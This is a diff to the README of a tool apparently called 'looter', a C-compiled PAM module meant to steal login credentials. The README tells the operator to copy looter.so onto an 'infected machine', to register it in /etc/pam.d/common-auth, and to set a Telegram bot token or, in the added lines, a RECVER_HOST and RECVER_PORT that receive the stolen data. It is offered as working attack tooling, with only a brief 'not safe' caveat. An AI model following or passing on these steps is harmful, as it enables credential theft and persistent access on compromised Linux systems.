@@ -10,13 +10,16 @@ Now with this C version, you compile it on your machine and send it to the infec
 # Configure
 Edit the `looter.c` and add your telegram bot token and your user id.
 
+
+In this way, you need to edit the `looter.c` and add your RECVER_HOST and RECVER_PORT.                     
+Please note that this is not safe. Only help you test usability.      --- aplyc1a                      
 # Compiling
 ```bash
 make
 ```
 
 # Usage
-Copy the `looter.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
+Copy the `looter.so` to the infected machine on `/lib/xxx/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
 ```
 auth optional module.so
 account optional module.so
